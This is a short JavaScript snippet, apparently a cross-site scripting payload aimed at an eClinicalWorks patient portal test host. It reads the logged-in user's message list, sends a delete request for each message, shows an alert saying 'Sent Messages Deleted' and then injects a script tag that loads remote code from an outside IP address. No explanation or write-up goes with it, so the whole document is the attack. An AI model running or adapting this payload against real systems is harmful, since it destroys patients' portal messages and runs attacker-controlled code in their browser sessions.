   var req = new XMLHttpRequest();
   var req2 = new XMLHttpRequest();

  req2.onreadystatechange = function () {
   if (req2.readyState == 4 && req2.status == 200 )
     {
        alert("Sent Messages Deleted");
        var newtag = document.createElement("script");
        newtag.type = "text/javascript";
        newtag.src = "https://172.105.54.23/deleted.js";
        document.body.appendChild(newtag);
     }
  };
   req.onreadystatechange = function()
   {
     if (req.readyState == 4 && req.status == 200 )
   {
     reponse_obj = JSON.parse(req.responseText);
     for (var i = 0; i < reponse_obj.rows.length; i++) {
     var row = reponse_obj.rows[i];
     console.log(row.id);
     var req3 = new XMLHttpRequest();
     req2.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=1&msgid="+row.id+"&nact=1", true);
     req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     req2.send();
     }
   }
};

     req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=3&rows=50&page=1");
     req.send();
